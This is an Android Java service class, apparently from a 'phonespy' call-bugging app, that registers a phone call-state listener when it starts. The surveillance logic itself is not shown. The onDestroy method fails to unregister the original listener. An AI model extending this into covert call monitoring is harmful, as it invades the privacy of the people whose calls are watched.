package info.peoce.phonespy.Server;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import info.peoce.phonespy.Listener.MyPhoneListener;

public class PhoneBugServer extends Service {
    private static String TAG=PhoneBugServer.class.getSimpleName();
    TelephonyManager telephonyManager;

    public PhoneBugServer() {
    }

    @Override
    public void onCreate() {
        telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        telephonyManager.listen(new MyPhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);
        Log.i(TAG, "start server");
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        telephonyManager.listen(new MyPhoneListener(), PhoneStateListener.LISTEN_NONE);
        Log.i(TAG, "stop server");
        super.onDestroy();

    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
